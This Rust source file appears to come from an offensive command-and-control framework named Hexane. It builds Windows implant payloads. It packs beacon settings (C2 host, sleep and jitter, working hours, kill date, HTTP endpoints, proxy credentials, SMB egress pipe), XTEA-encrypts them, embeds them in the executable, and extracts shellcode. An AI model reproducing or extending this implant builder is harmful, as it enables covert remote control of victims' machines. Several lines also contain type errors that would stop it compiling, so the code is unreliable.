use std::fs;
use std::path::Path;
use std::str::FromStr;
use rand::Rng;

use crate::stream::Stream;
use crate::error::Error::Custom;
use crate::{log_debug, log_info};
use crate::cipher::{crypt_create_key, crypt_xtea};
use crate::binary::{copy_section_data, embed_section_data};
use crate::rstatic::{DEBUG_FLAGS, RELEASE_FLAGS, USERAGENT};
use crate::types::{Builder, Compiler, Config, Loader, Network, UserSession};
use crate::utils::{canonical_path_all, generate_hashes, generate_object_path, normalize_path, run_command};

use crate::types::NetworkType::Http as HttpType;
use crate::types::NetworkOptions::Http as HttpOpt;
use crate::types::NetworkType::Smb as SmbType;
use crate::types::NetworkOptions::Smb as SmbOpt;

#[derive(Debug, Default)]
pub struct Hexane {
    pub(crate) taskid:          u32,
    pub(crate) peer_id:         u32,
    pub(crate) group_id:        u32,
    pub(crate) build_type:      u32,
    pub(crate) session_key:     Vec<u8>,
    pub(crate) shellcode:       Vec<u8>,
    pub(crate) config:          Vec<u8>,
    pub(crate) active:          bool,
    pub(crate) main_cfg:        Config,
    pub(crate) builder_cfg:     Builder,
    pub(crate) compiler_cfg:    Compiler,
    pub(crate) network_cfg:     Option<Network>, // says "optional" but is checked for in the config
    pub(crate) loader_cfg:      Option<Loader>,
    pub(crate) user_session:    UserSession,
}

impl Hexane {
    pub(crate) fn setup_build(&mut self) -> crate::error::Result<()> {
        let mut rng = rand::thread_rng();

        self.compiler_cfg.build_directory = format!("./payload/{}", self.builder_cfg.output_name);
        self.peer_id = rng.gen::<u32>();
        self.group_id = 0;

        let compiler_flags = if self.main_cfg.debug {
            DEBUG_FLAGS.parse().unwrap()
        }
        else {
            RELEASE_FLAGS.parse().unwrap()
        };

        self.compiler_cfg.flags = compiler_flags;

        fs::create_dir_all(&self.compiler_cfg.build_directory)?;
        generate_hashes("./configs/strings.txt", "./core/include/names.hpp")?;

        self.create_config_patch()?;
        self.compile_sources()?;

        Ok(())
    }

    fn create_config_patch(&mut self) -> crate::error::Result<()> {
        self.session_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        let encrypt = self.main_cfg.encrypt;

        if encrypt {
            let patch_cpy = patch.clone();
            patch = crypt_xtea(&patch_cpy, &self.session_key, true)?;
        }

        self.config = patch;
        Ok(())
    }

    fn create_binary_patch(&mut self) -> crate::error::Result<Vec<u8>> {
        let mut stream = Stream::new();

        if let Some(modules) = &self.builder_cfg.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        } else {
            log_debug!(&"no external module names found. continue.".to_owned());
        }

        let working_hours = self.main_cfg.working_hours
            .as_ref()
            .map_or(Ok(0), |hours| i32::from_str(hours).map_err(|e|
                Custom(format!("create_binary_patch:: {e}"))))?;

        let kill_date = self.main_cfg.killdate
            .as_ref()
            .map_or(Ok(0), |date| i64::from_str(date).map_err(|e|
                Custom(format!("create_binary_patch:: {e}"))))?;


        stream.pack_bytes(&self.session_key);
        stream.pack_string(&self.main_cfg.hostname);
        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main_cfg.sleeptime);
        stream.pack_dword(self.main_cfg.jitter as u32);
        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        if let Some(network) = self.network_cfg.as_mut() {
            let rtype = &network.r#type;
            let opts = &network.options;

            match (rtype, &opts) {
                (HttpType, HttpOpt(ref http)) => {
                    let useragent = http.useragent.as_ref().unwrap_or(&USERAGENT);

                    stream.pack_wstring(useragent);
                    stream.pack_wstring(&http.address);
                    stream.pack_dword(http.port as u32);
                    stream.pack_dword(http.endpoints.len() as u32);

                    for endpoint in &http.endpoints {
                        stream.pack_wstring(endpoint);
                    }

                    if let Some(ref domain) = http.domain {
                        stream.pack_string(domain);
                    } else {
                        stream.pack_dword(0);
                    }

                    if let Some(ref proxy) = http.proxy {
                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);

                        stream.pack_dword(1);
                        stream.pack_wstring(&proxy_url);
                        stream.pack_wstring(proxy.username.as_ref().unwrap());
                        stream.pack_wstring(proxy.password.as_ref().unwrap());
                    } else {
                        stream.pack_dword(0);
                    }
                }

                (SmbType, SmbOpt(ref smb) ) => {
                    stream.pack_wstring(smb.egress_pipe
                        .as_ref()
                        .unwrap()
                        .as_str());
                }

                _ => return Err(Custom("create_binary_patch: unknown network type".to_string())),
            }
        }

        Ok(stream.buffer)
    }

    pub fn compile_sources(&mut self) -> crate::error::Result<()> {
        let output      = &self.builder_cfg.output_name;
        let root_dir    = &self.builder_cfg.root_directory;
        let build_dir   = &self.compiler_cfg.build_directory;

        let mut components  = Vec::new();
        let src_path        = Path::new(root_dir).join("src");
        let entries         = canonical_path_all(src_path)?;

        for path in entries {
            let source = normalize_path(path
                .to_str()
                .unwrap()
                .into()
            );

            let object_file = generate_object_path(&source, Path::new(build_dir));
            let object = normalize_path(object_file
                .to_str()
                .unwrap()
                .into()
            );

            let mut command = String::new();
            match path.extension()
                .and_then(|ext| ext.to_str())
            {
                Some("asm") => {
                    command.push_str("nasm");
                    command.push_str(format!(" -f win64 {} -o {}", source, object).as_str());

                    if let Err(e) = run_command(command.as_str(), "compiler_error") {
                        return Err(Custom(format!("compile_sources::{e}")));
                    }
                    components.push(object);
                }
                Some("cpp") => {
                    components.push(source);
                }
                _ => { continue; }
            }
        }

        log_info!(&"linking final objects".to_string());

        let mut linker  = String::new();
        let includes    = self.generate_includes();
        let definitions = self.generate_definitions();

        let output  = Path::new(build_dir).join(output).to_str().unwrap();
        let flags   = &self.compiler_cfg.flags;
        let targets = components.join(" ");

        if let Some(script) = &self.builder_cfg.linker_script {
            linker = Path::new(root_dir).join(script);
            linker = normalize_path(linker.into());
            linker = format!(" -T {} ", linker.as_str());
        }

        let command = format!("{} {} {} {} {} {} -o {}.exe", "x86_64-w64-mingw32-g++".to_string(), includes, definitions, targets, linker, flags, output);

        if let Err(e) = run_command(command.as_str(), "linker_error") {
            return Err(Custom(format!("compile_sources:: {e}")));
        }

        let config          = self.config.clone();
        let config_size     = self.main_cfg.config_size as usize;
        let embed_target    = output.unwrap();

        if let Err(e) = embed_section_data(&format!("{}.exe", embed_target), &config, config_size) {
            return Err(Custom(format!("compile_sources:: {e}")));
        }

        let mut shellcode: String = self.compiler_cfg.build_directory.to_owned();
        shellcode.push_str("/shellcode.bin");

        if let Err(e) = copy_section_data(&format!("{}.exe", embed_target), shellcode.as_str(), ".text") {
            return Err(Custom(format!("compile_sources:: {e}")));
        }

        // todo: extract shellcode
        // todo: create dll loader

        Ok(())
    }
}
